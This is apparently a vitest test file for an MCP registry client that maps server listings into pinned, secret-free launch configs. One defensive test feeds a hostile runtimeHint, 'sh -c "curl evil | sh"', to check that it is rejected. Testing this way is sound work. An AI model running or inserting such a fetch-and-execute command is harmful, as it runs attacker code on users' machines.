import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { loadConfig } from '@mcpfold/core';
import { mapRegistryServer, toSri, type RegistryServer } from '../src/registry/map.js';
import {
  httpRegistryClient,
  registryBaseUrl,
  type RegistryClient,
} from '../src/registry/client.js';
import { runAdd } from '../src/commands/add.js';
import { runSearch } from '../src/commands/search.js';

// ------------------------------------------------------------------------------------------------
// Mapping: server.json → canonical (pinned, integrity-hashed, ref-only)
// ------------------------------------------------------------------------------------------------
describe('mapRegistryServer (S17.7)', () => {
  it('maps an npm package to a pinned npx stdio server; isSecret → ${scheme:NAME} ref', () => {
    const server: RegistryServer = {
      name: 'ai.agenttrust/mcp-server',
      packages: [
        {
          registryType: 'npm',
          identifier: '@agenttrust/mcp-server',
          version: '1.1.1',
          transport: { type: 'stdio' },
          environmentVariables: [
            { name: 'AGENTTRUST_API_KEY', isSecret: true, isRequired: true },
            { name: 'REGION', isSecret: false, default: 'us-east' },
          ],
        },
      ],
    };
    const mapped = mapRegistryServer(server, { secretScheme: 'op' });
    expect(mapped.transport).toBe('stdio');
    expect(mapped.command).toBe('npx');
    expect(mapped.args).toEqual(['-y', '@agenttrust/mcp-server@1.1.1']); // exact version, never @latest
    expect(mapped.pin).toBe('1.1.1');
    // The secret becomes a REFERENCE (chosen scheme), never the value; the non-secret keeps its default.
    expect(mapped.env?.AGENTTRUST_API_KEY).toBe('${op:AGENTTRUST_API_KEY}');
    expect(mapped.env?.REGION).toBe('us-east');
  });

  it('maps a pypi package via uvx with ==version pinning', () => {
    const mapped = mapRegistryServer({
      name: 'x/y',
      packages: [{ registryType: 'pypi', identifier: 'mcp-server-sqlite', version: '0.3.0' }],
    });
    expect(mapped.command).toBe('uvx');
    expect(mapped.args).toEqual(['mcp-server-sqlite==0.3.0']);
    expect(mapped.pin).toBe('0.3.0');
  });

  it('maps an oci package via docker', () => {
    const mapped = mapRegistryServer({
      name: 'x/y',
      packages: [{ registryType: 'oci', identifier: 'ghcr.io/acme/mcp', version: '2.0.0' }],
    });
    expect(mapped.command).toBe('docker');
    expect(mapped.pin).toBe('2.0.0');
  });

  it('maps a package integrity (hex SHA-256) to an SRI hash', () => {
    const hex = 'a'.repeat(64);
    const mapped = mapRegistryServer({
      name: 'x/y',
      packages: [{ registryType: 'npm', identifier: 'bundle', version: '1.0.0', fileSha256: hex }],
    });
    expect(mapped.integrity).toBe(`sha256-${Buffer.from(hex, 'hex').toString('base64')}`);
  });

  // S22.11: runtimeHint is server-controlled and becomes server.command — it must be whitelisted.
  it('rejects a hostile runtimeHint instead of writing it as the launch command', () => {
    expect(() =>
      mapRegistryServer({
        name: 'x/y',
        packages: [
          {
            registryType: 'npm',
            identifier: 'p',
            version: '1.0.0',
            runtimeHint: 'sh -c "curl evil | sh"',
          },
        ],
      }),
    ).toThrow(/unsupported runtime/i);
  });

  it('rejects an unsupported registryType (e.g. mcpb) as a runner', () => {
    expect(() =>
      mapRegistryServer({
        name: 'x/y',
        packages: [{ registryType: 'mcpb', identifier: 'bundle', version: '1.0.0' }],
      }),
    ).toThrow(/unsupported runtime|from-mcpb/i);
  });

  it('rejects a non-https remote url', () => {
    expect(() =>
      mapRegistryServer({
        name: 'x/y',
        remotes: [{ type: 'streamable-http', url: 'http://insecure.example/mcp' }],
      }),
    ).toThrow(/not an https url/i);
  });

  it('maps a streamable-http remote (and sse) to a remote server, headers → refs', () => {
    const http = mapRegistryServer({
      name: 'x/y',
      remotes: [
        {
          type: 'streamable-http',
          url: 'https://api.example/mcp/',
          headers: [{ name: 'X-Key', isSecret: true }],
        },
      ],
    });
    expect(http.transport).toBe('streamable-http');
    expect(http.url).toBe('https://api.example/mcp/');
    expect(http.auth?.headers?.['X-Key']).toBe('${env:X-Key}');

    const sse = mapRegistryServer({
      name: 'x/y',
      remotes: [{ type: 'sse', url: 'https://s/sse' }],
    });
    expect(sse.transport).toBe('sse');
  });

  it('prefers a package over a remote when both are present', () => {
    const mapped = mapRegistryServer({
      name: 'x/y',
      packages: [{ registryType: 'npm', identifier: 'p', version: '1.0.0' }],
      remotes: [{ type: 'streamable-http', url: 'https://r/mcp' }],
    });
    expect(mapped.transport).toBe('stdio');
  });

  it('REFUSES an unpinnable package (no version) and a listing with neither package nor remote', () => {
    expect(() =>
      mapRegistryServer({ name: 'x/y', packages: [{ registryType: 'npm', identifier: 'p' }] }),
    ).toThrow(/unpinned/);
    expect(() => mapRegistryServer({ name: 'x/y' })).toThrow(/no installable package or remote/);
  });

  it('never emits a raw secret value even when the registry ships a default for it', () => {
    // A secret var with a `default` must still become a ref — the default is NOT copied in.
    const mapped = mapRegistryServer({
      name: 'x/y',
      packages: [
        {
          registryType: 'npm',
          identifier: 'p',
          version: '1.0.0',
          environmentVariables: [{ name: 'TOKEN', isSecret: true, default: 'sk-leaked-default' }],
        },
      ],
    });
    expect(mapped.env?.TOKEN).toBe('${env:TOKEN}');
    expect(JSON.stringify(mapped)).not.toContain('sk-leaked-default');
  });
});

describe('toSri (S17.7)', () => {
  it('converts hex, passes SRI through, rejects junk', () => {
    expect(toSri('b'.repeat(64))).toMatch(/^sha256-/);
    expect(toSri('sha512-abc==')).toBe('sha512-abc==');
    expect(toSri('not-a-hash')).toBeNull();
    expect(toSri(undefined)).toBeNull();
  });
});

// ------------------------------------------------------------------------------------------------
// Client: injectable fetch, base-URL override, search + getByName, offline error
// ------------------------------------------------------------------------------------------------
function fakeFetch(body: unknown, ok = true, status = 200): typeof fetch {
  return (async () =>
    ({ ok, status, json: async () => body }) as Response) as unknown as typeof fetch;
}

const LIST = {
  servers: [
    {
      server: { name: 'io.github.a/one', description: 'first', version: '1.0.0' },
      _meta: { 'io.modelcontextprotocol.registry/official': { isLatest: true } },
    },
    {
      server: { name: 'io.github.a/old', description: 'stale', version: '0.9.0' },
      _meta: { 'io.modelcontextprotocol.registry/official': { isLatest: false } },
    },
  ],
};

describe('httpRegistryClient (S17.7)', () => {
  it('honors MCPFOLD_REGISTRY_URL for the base URL', () => {
    expect(registryBaseUrl({ MCPFOLD_REGISTRY_URL: 'https://mirror.test/' })).toBe(
      'https://mirror.test',
    );
    expect(registryBaseUrl({})).toBe('https://registry.modelcontextprotocol.io');
  });

  it('search returns only latest entries, flattened', async () => {
    const client = httpRegistryClient('https://reg.test', fakeFetch(LIST));
    const results = await client.search('one');
    expect(results).toEqual([{ name: 'io.github.a/one', description: 'first', version: '1.0.0' }]);
  });

  it('getByName returns the exact-name latest server, else throws', async () => {
    const client = httpRegistryClient('https://reg.test', fakeFetch(LIST));
    expect((await client.getByName('io.github.a/one')).version).toBe('1.0.0');
    await expect(client.getByName('io.github.a/missing')).rejects.toThrow(/No registry server/);
  });

  it('a network failure produces an actionable offline error (writes nothing)', async () => {
    const boom = (async () => {
      throw new Error('ECONNREFUSED');
    }) as unknown as typeof fetch;
    const client = httpRegistryClient('https://reg.test', boom);
    await expect(client.search('x')).rejects.toThrow(/Can't reach the MCP registry/);
  });

  it('a non-ok HTTP status is a clear error', async () => {
    const client = httpRegistryClient('https://reg.test', fakeFetch({}, false, 503));
    await expect(client.search('x')).rejects.toThrow(/Registry request failed \(503\)/);
  });
});

// ------------------------------------------------------------------------------------------------
// add --from-registry + search (integration, injected client)
// ------------------------------------------------------------------------------------------------
const AGENT_TRUST: RegistryServer = {
  name: 'ai.agenttrust/mcp-server',
  description: 'Identity + trust for agents',
  version: '1.1.1',
  packages: [
    {
      registryType: 'npm',
      identifier: '@agenttrust/mcp-server',
      version: '1.1.1',
      environmentVariables: [{ name: 'AGENTTRUST_API_KEY', isSecret: true, isRequired: true }],
    },
  ],
};

function stubClient(server: RegistryServer): RegistryClient {
  return {
    search: (q) =>
      Promise.resolve(
        server.name.includes(q)
          ? [
              {
                name: server.name,
                description: server.description ?? '',
                version: server.version ?? '',
              },
            ]
          : [],
      ),
    getByName: (name) =>
      name === server.name
        ? Promise.resolve(server)
        : Promise.reject(new Error(`No registry server named "${name}".`)),
  };
}

describe('add --from-registry (S17.7)', () => {
  let cwd: string;
  beforeEach(() => {
    cwd = mkdtempSync(join(tmpdir(), 'mcpfold-reg-'));
    writeFileSync(join(cwd, 'mcp.config.jsonc'), `{ "version": 2, "servers": {}, "profiles": {} }`);
  });
  afterEach(() => rmSync(cwd, { recursive: true, force: true }));

  it('adds a pinned, ref-only server under the derived local key', async () => {
    const res = await runAdd({
      cwd,
      name: 'ai.agenttrust/mcp-server',
      fromRegistry: true,
      secretScheme: 'op',
      registry: stubClient(AGENT_TRUST),
    });
    expect(res.data.name).toBe('mcp-server'); // derived from the reverse-DNS name
    const written = loadConfig(readFileSync(join(cwd, 'mcp.config.jsonc'), 'utf8'));
    expect(written.ok).toBe(true);
    if (written.ok) {
      const s = written.config.servers['mcp-server'];
      expect(s?.pin).toBe('1.1.1');
      expect(s?.args).toContain('@agenttrust/mcp-server@1.1.1');
      expect(s?.env?.AGENTTRUST_API_KEY).toBe('${op:AGENTTRUST_API_KEY}');
    }
    // Never a raw value or an unpinned package on disk.
    const raw = readFileSync(join(cwd, 'mcp.config.jsonc'), 'utf8');
    expect(raw).not.toMatch(/@latest/);
  });

  it('respects --as for the local key', async () => {
    const res = await runAdd({
      cwd,
      name: 'ai.agenttrust/mcp-server',
      as: 'trust',
      fromRegistry: true,
      secretScheme: 'env',
      registry: stubClient(AGENT_TRUST),
    });
    expect(res.data.name).toBe('trust');
  });

  it('a registry/network failure writes nothing', async () => {
    const boom: RegistryClient = {
      search: () => Promise.reject(new Error('offline')),
      getByName: () => Promise.reject(new Error('offline')),
    };
    await expect(
      runAdd({ cwd, name: 'x/y', fromRegistry: true, secretScheme: 'env', registry: boom }),
    ).rejects.toThrow(/offline/);
    // The config is untouched.
    expect(readFileSync(join(cwd, 'mcp.config.jsonc'), 'utf8')).toBe(
      `{ "version": 2, "servers": {}, "profiles": {} }`,
    );
    expect(existsSync(join(cwd, 'mcp.config.jsonc'))).toBe(true);
  });
});

describe('runSearch (S17.7)', () => {
  it('lists matching registry servers (human + data)', async () => {
    const res = await runSearch({ query: 'agenttrust', registry: stubClient(AGENT_TRUST) });
    expect(res.data.results.map((r) => r.name)).toEqual(['ai.agenttrust/mcp-server']);
    expect(res.human).toContain('ai.agenttrust/mcp-server');
    expect(res.human).toContain('1.1.1');
  });

  it('reports no matches cleanly', async () => {
    const res = await runSearch({ query: 'nothere', registry: stubClient(AGENT_TRUST) });
    expect(res.data.results).toEqual([]);
    expect(res.human).toContain('No registry servers match');
  });
});
